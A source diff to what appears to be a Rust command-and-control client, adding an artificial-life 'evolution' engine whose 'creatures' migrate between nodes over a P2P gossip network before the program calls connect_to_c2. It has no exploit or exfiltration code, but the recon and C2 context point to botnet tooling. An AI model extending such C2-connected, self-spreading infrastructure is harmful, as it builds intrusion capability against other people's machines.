@@ -14,6 +14,7 @@ mod agentic;
 mod recon;
 mod compute;
 mod db;
+mod evolution;
 
 use config::FullConfig;
 use db::ClientDb;
@@ -34,9 +35,19 @@ fn main() {
             .unwrap_or_else(|_| ClientDb::open_memory().expect("in-memory db"))
     );
 
+    let node_id: Vec<u8> = {
+        let id = uuid::Uuid::new_v4();
+        id.as_bytes().to_vec()
+    };
+
     let rt = Runtime::new().unwrap();
     rt.block_on(async {
-        if config.p2p.enabled {
+        // Spawn the evolutionary soup - a local Tierra/Avida world running on a
+        // dedicated thread, fed by network telemetry as its ocean (arXiv:2409.01469).
+        let mut evo = evolution::EvolutionEngine::new(node_id.clone());
+        eprintln!("[*] Evolution soup spawned");
+
+        let gossip_engine: Option<Arc<p2p::gossip::GossipEngine>> = if config.p2p.enabled {
             let gossip_addr: std::net::SocketAddr = config.p2p.gossip_address.parse()
                 .expect("Invalid P2P gossip address");
             let bootstrap: Vec<std::net::SocketAddr> = config.p2p.bootstrap_peers.iter()
@@ -50,9 +61,56 @@ fn main() {
                     let engine = Arc::new(engine);
                     engine.start();
                     eprintln!("[*] P2P gossip: {}", config.p2p.gossip_address);
+                    Some(engine)
                 }
-                Err(e) => eprintln!("[!] P2P failed: {}", e),
+                Err(e) => {
+                    eprintln!("[!] P2P failed: {}", e);
+                    None
+                }
             }
+        } else {
+            None
+        };
+
+        // Background task: periodic evolution cycle and creature migration via gossip.
+        if let Some(ref engine) = gossip_engine {
+            let engine = Arc::clone(engine);
+            tokio::spawn(async move {
+                let mut interval = tokio::time::interval(std::time::Duration::from_secs(30));
+                loop {
+                    interval.tick().await;
+                    // Drain incoming creature migrations from gossip
+                    let mut incoming = Vec::new();
+                    {
+                        let cmds = engine.command_rx.read().await;
+                        for (id, payload) in cmds.iter() {
+                            if id.starts_with("evo:") {
+                                if let Ok(migrants) = serde_json::from_slice::<Vec<stalinium_evolution::node::Migrant>>(payload) {
+                                    incoming.extend(migrants);
+                                }
+                            }
+                        }
+                    }
+                    if !incoming.is_empty() {
+                        evo.receive_migrants(incoming).await;
+                    }
+
+                    // Run an evolution cycle; broadcast emigrants if ready
+                    if let Some(emigrants) = evo.cycle().await {
+                        if let Ok(payload) = serde_json::to_vec(&emigrants) {
+                            engine.broadcast_creatures(payload).await;
+                        }
+                    }
+
+                    let snap = evo.snapshot();
+                    if snap.epoch > 0 && snap.epoch % 50 == 0 {
+                        eprintln!(
+                            "[*] Evolution: epoch {} pop {} diversity {} genes {} computing {}",
+                            snap.epoch, snap.population, snap.diversity, snap.alive_genes, snap.computing
+                        );
+                    }
+                }
+            });
         }
 
         match connect_to_c2(&config.settings).await {
